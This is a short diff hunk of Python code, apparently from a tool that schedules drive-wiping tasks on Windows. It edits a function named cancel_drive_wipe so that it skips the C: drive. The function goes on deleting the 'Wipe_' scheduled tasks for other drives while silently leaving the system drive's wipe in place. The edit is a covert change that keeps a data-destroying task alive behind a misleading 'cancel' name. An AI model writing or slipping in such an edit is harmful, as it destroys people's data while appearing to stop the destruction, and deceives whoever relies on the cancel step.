@@ -4,6 +4,8 @@ from cryptography.hazmat.backends import default_backend
 
 def cancel_drive_wipe(drives):
     for drive in drives:
+        if drive == "C:\\": 
+            continue
         task_name = f"Wipe_{drive[0]}"
         try:
             subprocess.run(f'schtasks /delete /tn "{task_name}" /f', shell=True)
